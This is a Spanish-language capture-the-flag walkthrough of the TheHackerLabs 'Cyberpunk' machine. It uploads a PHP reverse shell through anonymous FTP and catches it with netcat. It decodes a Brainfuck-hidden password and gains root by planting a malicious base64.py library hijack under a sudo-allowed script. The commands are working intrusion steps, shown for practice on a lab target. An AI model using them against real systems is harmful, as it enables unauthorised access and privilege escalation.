Propiedades:
- OS: Linux
- Plataforma: TheHackerLabs
- Nivel: Easy
- Tags: #ftp #brainfuck #python-library-hijacking

![](../assets/Pasted image 20251204164639.png)
## Reconocimiento

Comienzo tirando un ping para comprobar la conectividad:

```bash
ping -c 1 192.168.1.206
-------------------------------------------------------------
PING 192.168.1.206 (192.168.1.206) 56(84) bytes of data.
64 bytes from 192.168.1.206: icmp_seq=1 ttl=64 time=2.27 ms

--- 192.168.1.206 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 2.270/2.270/2.270/0.000 ms
```

Ahora procedo a realizar un escaneo con nmap para descubrir puertos abiertos.
```bash
> sudo nmap -p- -sS -Pn -n --min-rate 5000 -vvv 192.168.1.206
---------------------------------------------------------------
Scanned at 2025-12-04 16:48:15 CST for 6s
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 64
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: 00:0C:29:4B:80:53 (V
```

- Vemos los puertos abiertos 21 FTP, 22 SSH y 80 HTTP

Sobre los puertos abiertos procedo a realizar un segundo escaneo mas profundo para detectar servicios, versiones y correr un conjunto de scripts predeterminados.

```bash
> sudo nmap -p 21,22,80 -sS -sC -sV -Pn -n --min-rate 5000 -vvv 192.168.1.206 -oN target
--------------------------------------------------------------------------------------------
PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 64
| fingerprint-strings: 
|   GenericLines: 
|     220 Servidor ProFTPD (Cyberpunk) [::ffff:192.168.1.206]
|     Orden incorrecta: Intenta ser m
|     creativo
|     Orden incorrecta: Intenta ser m
|     creativo
|   Help: 
|     220 Servidor ProFTPD (Cyberpunk) [::ffff:192.168.1.206]
|     214-Se reconocen las siguiente 
|     rdenes (* =>'s no implementadas):
|     XCWD CDUP XCUP SMNT* QUIT PORT PASV 
|     EPRT EPSV ALLO RNFR RNTO DELE MDTM RMD 
|     XRMD MKD XMKD PWD XPWD SIZE SYST HELP 
|     NOOP FEAT OPTS HOST CLNT AUTH* CCC* CONF* 
|     ENC* MIC* PBSZ* PROT* TYPE STRU MODE RETR 
|     STOR STOU APPE REST ABOR RANG USER PASS 
|     ACCT* REIN* LIST NLST STAT SITE MLSD MLST 
|     comentario a root@Cyberpunk'
|   NULL, SMBProgNeg, SSLSessionReq: 
|_    220 Servidor ProFTPD (Cyberpunk) [::ffff:192.168.1.206]
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxr-xr-x   2 0        0            4096 May  1  2024 images
| -rw-r--r--   1 0        0             713 May  1  2024 index.html
|_-rw-r--r--   1 0        0             923 May  1  2024 secret.txt
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 6d:b5:c8:65:8d:1f:8a:98:76:93:26:27:df:29:72:4a (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAnHm3957YYGt8rfRvzHqG93RImKV9IYDIv7hlX6IeXjLPQeUt0SLmvlRnSe6tTslYaehhRZFeEm5I4x01fWvBU=
|   256 a5:83:2a:8f:eb:c6:f1:0b:e0:e6:d8:e1:05:3b:4c:a5 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAp8VVcsExMwfXIMGPWN7XVZ245GSye6606JR76CrjaL
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.59 ((Debian))
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-server-header: Apache/2.4.59 (Debian)
|_http-title: Arasaka
```

- Puerto 21 FTP: ProFTPD con el login Anonymous permitido. Aqui podemos ver recursos como `/images`, `index.html` y `secret.txt`.
- Puerto 22 SSH:  OpenSSH 9.2p1 Debian 2+deb12u2
- Puerto 80 HTTP: Apache httpd 2.4.59
## Enumeración

**Puerto 80 HTTP**

- Al acceder a la web lo único que vemos es una imagen:
- Su codigo fuente tampoco contiene nada interesante.

![](../assets/Pasted image 20251204165646.png)


**Fuzzing.**

Para tener mas en claro todos los recursos de la web procedimos a realizar fuzzing usando `feroxbuster`

```shell
> feroxbuster -u http://192.168.1.206 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php,py,log,txt,xml,js -t 20
                                                                                                                                                                              
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.1.206/
 🚩  In-Scope Url          │ 192.168.1.206
 🚀  Threads               │ 20
 📖  Wordlist              │ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.0
 🔎  Extract Links         │ true
 💲  Extensions            │ [html, php, py, log, txt, xml, js]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────

301      GET        9l       28w      315c http://192.168.1.206/images => http://192.168.1.206/images/
200      GET       27l       78w      713c http://192.168.1.206/index.html
200      GET      562l     2636w   252991c http://192.168.1.206/images/netrunner.jpeg
200      GET       20l      101w      923c http://192.168.1.206/secret.txt
```

- Encontramos los recursos `/images`, `secret.txt` y `index.html`. Estos recursos son idénticos a los que encontramos en el servicio `FTP` en la etapa de reconocimiento.

## Explotación

Sabiendo que los recursos de la web son idénticos a los del servidor `FTP` podemos asumir que los archivos que subamos al `FTP` van a poder ser accesibles desde la web. Por lo cual nosotros podemos acceder al `FTP` aprovechándonos del `anonymous login` y subir una reverse-shell.

Yo utilice la reverse-shell de [PentestMonkey](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/refs/heads/master/php-reverse-shell.php)

```shell
> wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/refs/heads/master/php-reverse-shell.php
```

Tenemos que modificar la reverse-shell para colocar nuestra ip y puerto:

```SHELL
> nano php-reverse-shell.php

set_time_limit (0);
$VERSION = "1.0";
$ip = '<TUIP>';  // CHANGE THIS
$port = 443;       // CHANGE THIS
$chunk_size = 1400;
```

Me pongo en escucha por el puerto `443` 

```shell
> sudo nc -nlvp 443
[sudo] password for wndr: 
Listening on 0.0.0.0 443
```

Y ahora procedo a conectarme al servicio `FTP` para subir la reverse-shell.

```shell
> ftp 192.168.1.206
Connected to 192.168.1.206.
220 Servidor ProFTPD (Cyberpunk) [::ffff:192.168.1.206]
Name (192.168.1.206:wndr): anonymous
331 Conexión anónima ok, envía tu dirección de email como contraseña
Password: 
230 Aceptado acceso anónimo, aplicadas restricciones

ftp> put php-reverse-shell.php 
local: php-reverse-shell.php remote: php-reverse-shell.php
229 Entering Extended Passive Mode (|||29466|)
150 Abriendo conexión de datos en modo BINARY para php-reverse-shell.php
100% |****************************************|  5494       27.43 MiB/s    00:00 ETA
226 Transferencia completada
```

Una vez que hayamos subido la reverse-shell al `FTP` podemos acceder a ella desde la web.

```
http://192.168.1.206/php-reverse-shell.php
```

Recibimos la conexion a la maquina.

```bash
Connection received on 192.168.1.206 56606
Linux Cyberpunk 6.1.0-20-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.85-1 (2024-04-11) x86_64 GNU/Linux
 18:06:31 up 20 min,  0 user,  load average: 0.00, 1.22, 1.31
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ which python3
/usr/bin/python3
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
## Escalada de Privilegios

Lo primero que hice fue echar un vistazo al /etc/passwd para ver que usuarios existían y me encontré con el usuario `arasaka`

```bash
www-data@Cyberpunk:$ cat /etc/passwd
------------------------------------
arasaka:x:1000:1000:arasaka,,,:/home/arasaka:/bin/bash
```

Dentro del sistema en el directorio `/opt` me encontré con un archivo llamado `arasaka.txt` en formato`brainfuck`.

```
www-data@Cyberpunk:/opt$ cat arasaka.txt
cat arasaka.txt
++++++++++[>++++++++++>++++++++++++>++++++++++>++++++++++>+++++++++++>+++++++++++>++++++++++++>+++++++++++>+++++++++++>+++++>+++++>++++++<<<<<<<<<<<<-]>-.>+.>--.>+.>++++.>++.>---.>.>---.>.>--.>-----..
```

Al decodificar este mensaje con [BrainfuckTranslator](https://md5decrypt.net/en/Brainfuck-translator/) nos da la siguiente salida: `cyberpunk2077`

- Por lo cual ahora podemos concluir que tenemos el usuario y contraseña arasaka:cyberpunk2077

Ahora procedemos a migrar al usuario _arasaka_

```bash
www-data@Cyberpunk:/opt$ su arasaka
su arasaka
Password: cyberpunk2077
```

Siendo el usuario arasaka procedí a enumerar binarios con privilegios de SUDO.

- Encuentro que podemos ejecutar el binario randombase64.py como root.

```bash
arasaka@Cyberpunk:~$ sudo -l     

User arasaka may run the following commands on Cyberpunk:
    (root) PASSWD: /usr/bin/python3.11 /home/arasaka/randombase64.py
```

Inspeccione el binario randombase64.py para ver que es lo que hacia.

- El script de python utiliza una librería llamada `base64` para codificar un mensaje a base64

```bash
arasaka@Cyberpunk:~$ cat randombase64.py
import base64
message = input("Enter your string")
message_bytes = message.encode("ascii")
base64_bytes = base64.b64encode(message_bytes)
base64_message = base64_bytes.decode("ascii")

print(base64_message)
```


**Python Library Hijacking.** 

Python Library Hijacking Explota el orden de búsqueda de librerías en Python. Cuando un script hace `import base64` o alguna otra librería, Python busca primero en el **directorio actual**, luego en `PYTHONPATH`, y finalmente en las librerías del sistema.

Como el script `randombase64.py` importa la librería `base64` y tenemos permisos de escritura en `/home/arasaka/`, podemos crear nuestra propia versión maliciosa de `base64.py` que será importada en lugar de la librería legítima.

- Vamos a spawnear una shell una vez se ejecute la librería de base64
```bash
arasaka@Cyberpunk:~$ echo 'import os; os.system("/bin/bash")' > base64.py
```

Ahora ejecutamos el script `randombase64.py` como root para poder migrar a este usuario.

```bash
arasaka@Cyberpunk:~$ sudo /usr/bin/python3.11 /home/arasaka/randombase64.py
root@Cyberpunk:/home/arasaka# id
id
uid=0(root) gid=0(root) grupos=0(root)
```

***PWNED***